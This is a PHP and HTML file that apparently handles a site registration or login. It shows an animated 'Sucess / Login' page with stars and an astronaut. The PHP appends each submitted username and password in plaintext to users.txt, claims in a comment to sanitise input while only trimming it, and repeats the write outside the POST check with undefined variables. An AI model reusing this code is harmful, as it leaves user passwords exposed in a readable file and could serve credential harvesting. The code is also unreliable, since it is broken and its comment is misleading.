<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Validate and sanitize input before writing to the file
    $username = trim($username);
    $password = trim($password);

    // Open the file in append mode
    $file = fopen("users.txt", "a");

    if ($file) {
        // Write the user's information to the file
        fwrite($file, "Username: $username\n");
        fwrite($file, "Password: $password\n");
        fwrite($file, "-----------------\n");

        fclose($file);

        echo "Registration successful. Data written to users.txt.";
    } else {
        echo "Error writing to file.";
    }
}
$file = fopen("users.txt", "a");
fwrite($file, "Username: $username\n");
        fwrite($file, "Password: $password\n");
        fwrite($file, "-----------------\n");
?>
<html lang="en">
<style>
    body{
        margin:0;
        padding:0;
        font-family: 'Tomorrow', sans-serif;
        height:100vh;
        background-image: linear-gradient(to top, #2e1753, #1f1746, #131537, #0d1028, #050819);
        display:flex;
        justify-content:center;
        align-items:center;
        overflow:hidden;
    }
    .text{
        position:absolute;
        top:10%;
        color:#fff;
        text-align:center;
    }
    h1{
        font-size:10em;
    }
    .star{
        position:absolute;
        width:2px;
        height:2px;
        background:#fff;
        right:0;
        animation:starTwinkle 3s infinite linear;
    }
    .astronaut img{
        width:100px;
        position:absolute;
        top:55%;
        animation:astronautFly 6s infinite linear;
    }
    @keyframes astronautFly{
        0%{
            left:-100px;
        }
        25%{
            top:50%;
            transform:rotate(30deg);
        }
        50%{
            transform:rotate(45deg);
            top:55%;
        }
        75%{
            top:60%;
            transform:rotate(30deg);
        }
        100%{
            left:110%;
            transform:rotate(45deg);
        }
    }
    @keyframes starTwinkle{
        0%{
            background:rgba(255,255,255,0.4);
        }
        25%{
            background:rgba(255,255,255,0.8);
        }
        50%{
            background:rgba(255,255,255,1);
        }
        75%{
            background:rgba(255,255,255,0.8);
        }
        100%{
            background:rgba(255,255,255,0.4);
        }
    }
    a{
        color: inherit;
        text-decoration: none;
        cursor: pointer;
    }
    .button{
        border-radius: 1.8em;
        background-size: 200% 100%;
        transition: background-position 0.8s ease-out;
        background-image: linear-gradient(#000, #000),
        linear-gradient(120deg, #713afc 0%, #0ff 50%, #7e0cce 100%);
        box-shadow: #5E5DF0 0 10px 20px -10px;
        box-sizing: border-box;
        color: #FFFFFF;
        cursor: pointer;
        font-size: 16px;
        font-weight: 700;
        line-height: 24px;
        opacity: 1;
        padding: 8px 18px;
        user-select: none;
        -webkit-user-select: none;
        touch-action: manipulation;
        width: fit-content;
        word-break: normal;
        border: 0.25em solid transparent;
        background-origin: border-box;
        background-clip: padding-box, border-box;
        align-self: center;
        margin-top: 0.5em;
    }
    .button:hover{
        background-position: 100% 0;
    }

    .button:active{
        background-image: linear-gradient(120deg, #f09 0%, #0ff 50%, #9f0 100%);
    }
    </style>
<script>document.addEventListener("DOMContentLoaded",function(){

    var body=document.body;
    setInterval(createStar,100);
    function createStar(){
        var right=Math.random()*500;
        var top=Math.random()*screen.height;
        var star=document.createElement("div");
        star.classList.add("star")
        body.appendChild(star);
        setInterval(runStar,10);
        star.style.top=top+"px";
        function runStar(){
            if(right>=screen.width){
                star.remove();
            }
            right+=3;
            star.style.right=right+"px";
        }
    }
})</script>

<div class="text">
    <div>Sucess</div>
    <h1>Login</h1>
    <hr>
    <div>Enjoy!</div>
</div>
<a href="../index.html" class="button">Go home</a>
<div class="astronaut">
    <img src="../assets/astronaut.png" alt="" class="src">
</div>
</html>
